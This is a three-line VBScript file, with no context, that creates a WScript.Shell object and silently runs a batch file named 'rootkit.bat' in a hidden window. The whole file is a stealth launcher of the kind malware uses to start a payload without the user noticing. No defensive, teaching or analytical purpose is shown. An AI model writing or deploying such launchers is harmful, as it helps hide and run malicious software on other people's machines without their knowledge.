Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd /c rootkit.bat", 0, False
Set WshShell = Nothing